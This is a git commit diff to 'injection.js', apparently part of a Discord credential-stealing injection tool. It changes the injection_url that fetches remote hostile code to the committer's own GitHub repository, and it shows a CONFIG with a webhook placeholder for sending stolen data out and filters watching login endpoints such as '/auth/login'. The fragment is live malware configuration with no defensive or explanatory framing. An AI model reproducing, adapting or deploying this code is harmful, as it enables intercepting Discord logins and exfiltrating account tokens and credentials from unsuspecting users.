6059352209e51fd08b0229b9d107c2946049cfd2
YisvarkiYelehaton <leveluplabsholdery@gmail.com>
2026-02-25 16:33:05 -0500

    Update injection.js

--- injection.js
+++ injection.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/YisvarkiYelehaton/injecting/refs/heads/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
